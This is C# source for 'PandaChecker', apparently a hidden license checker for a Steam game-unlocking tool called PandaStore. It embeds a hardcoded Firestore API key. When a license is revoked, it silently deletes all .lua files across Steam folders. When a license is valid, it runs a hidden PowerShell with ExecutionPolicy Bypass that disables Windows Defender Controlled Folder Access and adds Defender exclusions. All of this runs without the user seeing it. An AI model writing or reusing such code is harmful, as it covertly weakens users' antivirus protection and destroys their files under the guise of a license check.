using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace PandaChecker
{
    internal class Program
    {
        private const string ProjectId = "pandastoreupdate";
        private const string ApiKey = "AIzaSyAU1Nc1yjcf2AIc0rZh3mFyo5cCBAbwreo";
        private static readonly HttpClient HttpClient = new HttpClient();

        static async Task Main(string[] args)
        {
            try
            {
                string appDataDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PandaStore");
                string licenseFile = Path.Combine(appDataDir, "license.json");

                if (!File.Exists(licenseFile))
                {
                    return; // No stored license, nothing to verify
                }

                string jsonContent = await File.ReadAllTextAsync(licenseFile);
                JsonNode? node = JsonNode.Parse(jsonContent);
                string? key = node?["key"]?.ToString();

                if (string.IsNullOrWhiteSpace(key))
                {
                    return;
                }

                // Query Firestore
                string url = $"https://firestore.googleapis.com/v1/projects/{ProjectId}/databases/(default)/documents/licenses/{Uri.EscapeDataString(key)}?key={ApiKey}";
                HttpResponseMessage response = await HttpClient.GetAsync(url);

                if (!response.IsSuccessStatusCode)
                {
                    // License document removed or network error
                    if (response.StatusCode == System.Net.HttpStatusCode.NotFound)
                    {
                        RevokeAndClean(appDataDir);
                    }
                    return;
                }

                string docJson = await response.Content.ReadAsStringAsync();
                JsonNode? docNode = JsonNode.Parse(docJson);
                var fields = docNode?["fields"];

                if (fields == null) return;

                string status = fields["status"]?["stringValue"]?.ToString() ?? "active";
                string licenseType = fields["license_type"]?["stringValue"]?.ToString() ?? "permanent";
                string? expiryDateStr = fields["expiry_date"]?["stringValue"]?.ToString();
                bool isTrial = fields["is_trial"]?["booleanValue"]?.GetValue<bool>() ?? false;
                string? expiresAtStr = fields["expires_at"]?["stringValue"]?.ToString();

                bool isExpired = false;
                if (isTrial && !string.IsNullOrWhiteSpace(expiresAtStr))
                {
                    if (DateTime.TryParse(expiresAtStr, null, System.Globalization.DateTimeStyles.AdjustToUniversal, out DateTime expTrial))
                    {
                        if (DateTime.UtcNow > expTrial)
                        {
                            isExpired = true;
                        }
                    }
                }
                else if (licenseType.Equals("monthly", StringComparison.OrdinalIgnoreCase) && !string.IsNullOrWhiteSpace(expiryDateStr))
                {
                    if (DateTime.TryParse(expiryDateStr, out DateTime expDate))
                    {
                        if (DateTime.UtcNow.Date > expDate.Date)
                        {
                            isExpired = true;
                        }
                    }
                }

                bool isSuspended = !status.Equals("active", StringComparison.OrdinalIgnoreCase);

                if (isSuspended || isExpired)
                {
                    // License is invalid -> Silently purge all LUA files from Steam!
                    RevokeAndClean(appDataDir);
                }
                else
                {
                    // License is valid -> Maintain health of all installed Steam games
                    EnsureAllInstalledSteamAppIdFiles();
                }
            }
            catch (Exception ex)
            {
                // Silent catch so no windows pops up
                try
                {
                    string logFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PandaStore", "checker.log");
                    File.AppendAllText(logFile, $"[{DateTime.Now}] Error: {ex.Message}\n");
                }
                catch { }
            }
        }

        private static void RevokeAndClean(string appDataDir)
        {
            try
            {
                // 1. Delete local license cache
                string licenseFile = Path.Combine(appDataDir, "license.json");
                string gamesCacheFile = Path.Combine(appDataDir, "cache_games.json");
                if (File.Exists(licenseFile)) File.Delete(licenseFile);
                if (File.Exists(gamesCacheFile)) File.Delete(gamesCacheFile);

                // 2. Find Steam Path
                List<string> steamFolders = GetSteamFolders();

                // 3. Search and delete all .lua files from Steam folders
                foreach (string steamFolder in steamFolders)
                {
                    if (!Directory.Exists(steamFolder)) continue;

                    try
                    {
                        var luaFiles = Directory.GetFiles(steamFolder, "*.lua", SearchOption.AllDirectories);
                        foreach (var luaFile in luaFiles)
                        {
                            try
                            {
                                File.Delete(luaFile);
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static List<string> GetSteamFolders()
        {
            List<string> folders = new List<string>();
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam");
                string? steamPath = key?.GetValue("SteamPath")?.ToString();
                if (!string.IsNullOrEmpty(steamPath) && Directory.Exists(steamPath))
                {
                    folders.Add(steamPath);

                    // Parse libraryfolders.vdf for extra Steam drives
                    string vdfPath = Path.Combine(steamPath, "steamapps", "libraryfolders.vdf");
                    if (File.Exists(vdfPath))
                    {
                        string[] lines = File.ReadAllLines(vdfPath);
                        foreach (var line in lines)
                        {
                            if (line.Contains("\"path\""))
                            {
                                var parts = line.Split("\"");
                                if (parts.Length >= 4)
                                {
                                    string extraPath = parts[3].Replace(@"\\", @"\");
                                    if (Directory.Exists(extraPath))
                                    {
                                        folders.Add(extraPath);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch { }
            return folders.Distinct().ToList();
        }

        private static void EnsureAllInstalledSteamAppIdFiles()
        {
            try
            {
                List<string> steamFolders = GetSteamFolders();
                var exePaths = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                var gameDirs = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

                foreach (string steamFolder in steamFolders)
                {
                    if (!Directory.Exists(steamFolder)) continue;
                    gameDirs.Add(steamFolder);
                    string steamExe = Path.Combine(steamFolder, "steam.exe");
                    if (File.Exists(steamExe)) exePaths.Add(steamExe);

                    string steamapps = Path.Combine(steamFolder, "steamapps");
                    if (!Directory.Exists(steamapps)) continue;

                    string commonDir = Path.Combine(steamapps, "common");

                    foreach (var acfFile in Directory.GetFiles(steamapps, "appmanifest_*.acf"))
                    {
                        try
                        {
                            string content = File.ReadAllText(acfFile);
                            var matchAppId = System.Text.RegularExpressions.Regex.Match(content, @"""appid""\s+""(\d+)""", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                            var matchDir = System.Text.RegularExpressions.Regex.Match(content, @"""installdir""\s+""([^""]+)""", System.Text.RegularExpressions.RegexOptions.IgnoreCase);

                            if (matchAppId.Success && matchDir.Success)
                            {
                                string appId = matchAppId.Groups[1].Value;
                                string installDirName = matchDir.Groups[1].Value;
                                string gameDir = Path.Combine(commonDir, installDirName);

                                if (Directory.Exists(gameDir))
                                {
                                    gameDirs.Add(gameDir);
                                    WriteAppIdFile(gameDir, appId);

                                    foreach (var f in Directory.GetFiles(gameDir, "*.exe", SearchOption.TopDirectoryOnly))
                                    {
                                        exePaths.Add(f);
                                    }

                                    string binDir = Path.Combine(gameDir, "bin");
                                    if (Directory.Exists(binDir))
                                    {
                                        WriteAppIdFile(binDir, appId);
                                        foreach (var sub in Directory.GetDirectories(binDir))
                                        {
                                            WriteAppIdFile(sub, appId);
                                            foreach (var f in Directory.GetFiles(sub, "*.exe", SearchOption.TopDirectoryOnly))
                                            {
                                                exePaths.Add(f);
                                            }
                                        }
                                    }

                                    foreach (var sub in Directory.GetDirectories(gameDir))
                                    {
                                        try
                                        {
                                            var subExes = Directory.GetFiles(sub, "*.exe", SearchOption.TopDirectoryOnly);
                                            if (subExes.Length > 0)
                                            {
                                                WriteAppIdFile(sub, appId);
                                                foreach (var exe in subExes)
                                                {
                                                    exePaths.Add(exe);
                                                }
                                            }
                                        }
                                        catch { }
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }

                // Fix Windows Defender Controlled Folder Access & Exclusions
                FixDefenderAndControlledFolderAccess(exePaths, gameDirs);

                // Fix Documents permissions
                FixUserDocumentsPermissions();
            }
            catch { }
        }

        private static void FixDefenderAndControlledFolderAccess(IEnumerable<string> exePaths, IEnumerable<string> gameDirs)
        {
            try
            {
                var sb = new System.Text.StringBuilder();
                sb.Append("Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue; ");

                foreach (var exe in exePaths)
                {
                    if (File.Exists(exe))
                    {
                        sb.Append($"Add-MpPreference -ControlledFolderAccessAllowedApplications '{exe.Replace("'", "''")}' -ErrorAction SilentlyContinue; ");
                    }
                }

                foreach (var dir in gameDirs)
                {
                    if (Directory.Exists(dir))
                    {
                        sb.Append($"Add-MpPreference -ExclusionPath '{dir.Replace("'", "''")}' -ErrorAction SilentlyContinue; ");
                    }
                }

                string script = sb.ToString();
                if (!string.IsNullOrWhiteSpace(script))
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{script}\"",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = false
                    };
                    using var p = Process.Start(psi);
                    p?.WaitForExit(8000);
                }
            }
            catch { }
        }

        private static void FixUserDocumentsPermissions()
        {
            try
            {
                string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                if (Directory.Exists(docs))
                {
                    var di = new DirectoryInfo(docs);
                    if ((di.Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                    {
                        di.Attributes &= ~FileAttributes.ReadOnly;
                    }

                    string[] criticalDirs = new[]
                    {
                        Path.Combine(docs, "American Truck Simulator"),
                        Path.Combine(docs, "Euro Truck Simulator 2"),
                        Path.Combine(docs, "My Games")
                    };

                    foreach (var cDir in criticalDirs)
                    {
                        if (!Directory.Exists(cDir))
                        {
                            Directory.CreateDirectory(cDir);
                        }
                        else
                        {
                            var cDi = new DirectoryInfo(cDir);
                            if ((cDi.Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                            {
                                cDi.Attributes &= ~FileAttributes.ReadOnly;
                            }
                        }
                    }
                }
            }
            catch { }
        }

        private static void WriteAppIdFile(string dir, string appId)
        {
            try
            {
                if (!Directory.Exists(dir)) return;
                string file = Path.Combine(dir, "steam_appid.txt");
                if (!File.Exists(file) || File.ReadAllText(file).Trim() != appId)
                {
                    File.WriteAllText(file, appId);
                }
            }
            catch { }
        }
    }
}
